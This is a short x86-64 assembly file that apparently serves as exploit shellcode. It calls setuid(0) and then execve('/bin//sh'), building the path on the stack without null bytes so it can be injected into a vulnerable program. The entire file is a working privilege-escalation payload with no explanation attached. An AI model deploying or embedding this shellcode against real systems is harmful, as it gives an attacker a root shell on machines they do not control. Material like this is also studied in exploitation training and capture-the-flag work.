.global _start
_start:
.intel_syntax noprefix
	xor eax, eax
	push rax
	pop rdi
	mov al, 105
	syscall

	xor eax, eax
	push rax
	push 0x6e69622f
	mov dword ptr [rsp + 4], 0x68732f2f
	push rsp
	pop rdi
	xor esi, esi
	xor edx, edx
	mov al, 59
	syscall
    